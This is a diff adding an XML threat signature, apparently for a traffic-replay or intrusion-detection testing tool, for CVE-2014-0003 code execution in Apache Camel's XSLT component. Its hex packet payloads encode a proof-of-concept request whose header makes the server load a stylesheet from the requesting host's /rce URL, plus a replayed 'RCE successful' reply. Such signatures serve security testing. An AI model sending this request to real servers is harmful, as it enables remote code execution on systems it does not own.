@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apache Camel XSLT Component Java Code Execution"/>
+    <EngDesc display="true" value="A code execution vulnerability has been reported in Apache Camel. The vulnerability is due to an error in handling XSL stylesheets in the XSLT component. A remote, unauthenticated attacker can exploit this vulnerability by sending a specially crafted XML message to the vulnerable server. Successful exploitation could result in the execution of arbitrary Java code on the target system with the privileges of the server process"/>
+    <Intent display="true">
+      <item value="DESIGN_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Apache"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Camel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="2.11.0_to_2.11.3"/>
+      <item value="2.12.0_to_2.12.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140303-01"/>
+    <CVEID display="true" value="CVE-2014-0003"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="103917"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ef10dbfa2679503c6a0f136f703f3bb6"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635315384477609856"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1396085429" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0F:42" destMac="00:50:56:B4:0E:ED" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00AE" Identification="5487" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="7CE0" srcIP="172.16.8.106" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="60991" destPort="$HTTPdestPort" SeqNumber="B9BE5308" AckNumber="BFA57C34" HeaderLength="08" WindowSize="00E5" Checksum="C264" UrgentPointer="0000" Options="0101080A135207820A52AB0C" Payload="504F5354202F706F6320485454502F312E310D0A486F73743A203137322E31362E382E38380D0A436F6E74656E742D4C656E6774683A20370D0A43616D656C58736C745265736F757263655572693A20687474703A2F2F3137322E31362E382E3130363A34353135392F7263650D0A0D0A3C706F63202F3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:ED" destMac="00:50:56:B4:0F:42" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="012B" Identification="D739" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="F9B0" srcIP="$destIP" destIP="172.16.8.106" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="60991" SeqNumber="BFA57C34" AckNumber="B9BE5382" HeaderLength="08" WindowSize="00E3" Checksum="B4FC" UrgentPointer="0000" Options="0101080A0A52AC5313520782" Payload="485454502F312E3120323030204F4B0D0A62726561646372756D6249643A2049442D7672742D35383536352D313339343536393438373438382D302D320D0A486F73743A203137322E31362E382E38380D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A5365727665723A204A6574747928372E362E392E763230313330313331290D0A0D0A36310D0A547565204D61722031312031363A32343A35382045445420323031340A4170616368652043616D656C20524345207375636365737366756C2120436F6D6D616E643A206A6176612E6C616E672E554E495850726F636573734034376233343439390D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
